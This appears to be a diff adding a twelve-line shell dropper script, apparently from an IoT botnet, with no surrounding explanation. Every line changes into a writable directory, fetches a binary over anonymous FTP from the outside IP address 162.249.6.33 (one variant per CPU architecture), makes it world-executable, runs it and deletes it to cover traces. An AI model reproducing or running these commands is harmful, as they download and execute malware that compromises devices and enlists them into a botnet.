@@ -1,0 +1,12 @@
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 162.249.6.33 8UsAm 8UsAm; chmod 777 8UsAm ./8UsAm; rm -rf 8UsAm
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 162.249.6.33 8UsAml 8UsAml; chmod 777 8UsAml ./8UsAml; rm -rf 8UsAml
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 162.249.6.33 8UsAsh 8UsAsh; chmod 777 8UsAsh ./8UsAsh; rm -rf 8UsAsh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 162.249.6.33 8UsA64 8UsA64; chmod 777 8UsA64 ./8UsA64; rm -rf 8UsA64
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 162.249.6.33 8UsA6 8UsA6; chmod 777 8UsA6 ./8UsA6; rm -rf 8UsA6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 162.249.6.33 8UsA68 8UsA68; chmod 777 8UsA68 ./8UsA68; rm -rf 8UsA68
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 162.249.6.33 8UsApc 8UsApc; chmod 777 8UsApc ./8UsApc; rm -rf 8UsApc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 162.249.6.33 8UsA58 8UsA58; chmod 777 8UsA58 ./8UsA58; rm -rf 8UsA58
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 162.249.6.33 8UsAk68 8UsAk68; chmod 777 8UsAk68 ./8UsAk68; rm -rf 8UsAk68
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 162.249.6.33 8UsAsc 8UsAsc; chmod 777 8UsAsc ./8UsAsc; rm -rf 8UsAsc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 162.249.6.33 8UsA4 8UsA4; chmod 777 8UsA4 ./8UsA4; rm -rf 8UsA4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 162.249.6.33 8UsA5 8UsA5; chmod 777 8UsA5 ./8UsA5; rm -rf 8UsA5
